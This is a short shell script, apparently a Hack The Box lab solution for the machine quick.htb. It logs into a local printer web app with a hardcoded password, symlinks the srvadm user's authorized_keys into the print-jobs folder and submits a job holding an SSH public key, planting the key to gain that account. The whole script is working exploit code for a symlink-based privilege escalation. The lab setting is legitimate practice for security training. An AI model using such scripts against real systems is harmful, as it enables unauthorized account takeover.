#!/bin/sh

# Run this as Sam on quick.htb to add the ssh public key to srvadm's authorized_keys

sess=$(curl -v 'http://localhost:9001/index.php' -H "Host: printerv2.quick.htb" --data 'email=srvadm%40quick.htb&password=yl51pbx' 2>&1 | grep PHPSESSID | sed 's/.*PHPSESSID=//' | sed 's/;.*//')
filename=$(php -r "echo date('Y-m-d_H:i:s');")
ln -s /home/srvadm/.ssh/authorized_keys "/var/www/jobs/${filename}"
curl 'http://localhost/job.php' -H 'Host: printerv2.quick.htb' -H "Cookie: PHPSESSID=${sess}" --data 'title=Port+8081&desc=ssh%2Drsa%20AAAAB3NzaC1yc2EAAAADAQABAAABgQDIxJfGA7%2F0W9izQKEb87wTkKw3Ko83AIjcDw%2BScukapOKIYZ%2FN16ApuuC3TeFuSBrWtiIY1ZY7b35pnXsYg9zju6bb%2Fv3Qz9EBAdepxE9yjJY6yzylCUjm%2Fm%2B2vUKdnMYYMfwCmaL9EgJfXsvom6x1oZ%2BdIjykB57PyoX53P0hZ%2B1Irz3IY5xqc8einuP0X%2F50vuT42XnqRQSvCLAar2E6LPWfUc0l4GoN7lhM7l8eZ6v9Qn0Rj%2FpDLDIxf4UL4o3FdLSiV4is%2F4G1SHe5i0IUWtRmW%2BUR3h%2Bxi5Ujh7L7Xhxr99WacvIg6SydVRndBh2fC3zZKTobZDwPNR43R9MI8hSFclPo2t4kKgFn5ywd16qUDD2B%2BUtKUt%2Famotpgq8TVRVaTjICbVrJA1TEmEDO%2BNV1zo%2B6Ym5%2BHJEd8E%2Blg%2FkuhP2%2BLNJ7e39SaNDzc7coL%2F0ZCxQieu6tteVcNotUlUBGRhJo2T4vPjIGX4IydWkjcPg6WFFG%2FWUhANYMSnc%3D&submit=yup' & > /dev/null 2>&1